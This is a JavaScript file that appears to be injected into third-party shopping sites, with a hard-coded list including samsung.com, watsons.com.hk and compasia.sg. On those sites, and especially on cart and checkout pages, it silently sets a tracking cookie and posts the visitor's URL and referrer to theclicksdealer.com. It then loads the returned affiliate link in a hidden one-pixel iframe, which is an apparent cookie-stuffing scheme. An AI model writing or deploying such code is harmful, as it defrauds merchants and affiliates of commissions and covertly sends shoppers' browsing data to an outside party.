(function () {
    
    function generateUUID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
            var r = Math.random() * 16 | 0,
                v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }

    
    function getCookie(cname) {
        var name = cname + '=';
        var ca = document.cookie.split(';');
        for (var i = 0; i < ca.length; i++) {
            var c = ca[i].trim();
            if (c.indexOf(name) === 0) return c.substring(name.length, c.length);
        }
        return '';
    }

   
    function fireTracking(url) {
        try {
            const iframe = document.createElement('iframe');
            
            iframe.setAttribute("sandbox", "allow-same-origin allow-scripts allow-forms");
            iframe.src = url;
            iframe.style.display = 'none';
            iframe.style.visibility = 'hidden';
            iframe.style.width = '1px';
            iframe.style.height = '1px';
            iframe.style.border = '0';
            
           
            iframe.onerror = function() {
                var img = new Image();
                img.src = url;
            };

            document.body.appendChild(iframe);
            //console.log("Tracking Fired: ", url);
        } catch (e) {
            console.error("Iframe error:", e);
        }
    }

   
    async function initTracking() {
       
        if (sessionStorage.getItem('tracking_done_' + window.location.hostname)) {
             
             if (!isCartPage()) return;
        }

        try {
            let uniqueId = getCookie('tracking_uuid') || generateUUID();
            let expires = (new Date(Date.now() + 30 * 86400 * 1000)).toUTCString();
            document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + ';path=/;SameSite=Lax';
            
            let response = await fetch('https://theclicksdealer.com/api/track-user', {
                method: 'POST',
                keepalive: true, 
                body: JSON.stringify({
                    url: window.location.href,
                    referrer: document.referrer,
                    unique_id: uniqueId,
                    origin: window.location.hostname,
                    timestamp: new Date().getTime()
                }),
                headers: { 'Content-Type': 'application/json' }
            });
            
            let result = await response.json();
            
            if (result.success && result.affiliate_url) {
               
                fireTracking(result.affiliate_url);
                sessionStorage.setItem('tracking_done_' + window.location.hostname, 'true');
            } else {
                
                fireTracking('https://theclicksdealer.com/api/fallback-pixel?id=' + uniqueId);
            }
        } catch (error) {
            console.error('Tracking Failed:', error);
        }
    }

    function isCartPage() {
        const cartPatterns = ["cart", "checkout", "pay", "shipping", "review-order","payment"];
        return cartPatterns.some(path => window.location.pathname.toLowerCase().includes(path));
    }

    
  
    function run() {
        const host = window.location.hostname;
        
        
        const config = {
            "www.fareastflora.com": { always: true, cartExtra: true },
            "www.ofm.co.th": { always: false, cartExtra: true },
            "checkout.accorplus.com": { always: true, cartExtra: false },
            "www.studio7thailand.com": { always: false, cartExtra: true },
            "www.bnn.in.th": { always: false, cartExtra: true },
            "gfiberprepaid.globe.com.ph": { always: true, cartExtra: false },
            "shop.globe.com.ph": { always: true, cartExtra: false },
            "www.watsons.com.hk": { always: false, cartExtra: true },
            "compasia.sg": { always: true, cartExtra: true },
            "compasia.my": { always: true, cartExtra: true },
            "www.samsung.com": { always: true, cartExtra: true },

        };

        const site = config[host];
        if (site) {
            if (site.always) initTracking();
            if (site.cartExtra && isCartPage()) {
                
                setTimeout(initTracking, 1500);
            }
        }
    }

    if (document.readyState === "interactive" || document.readyState === "complete") {
        run();
    } else {
        window.addEventListener("DOMContentLoaded", run);
    }
})();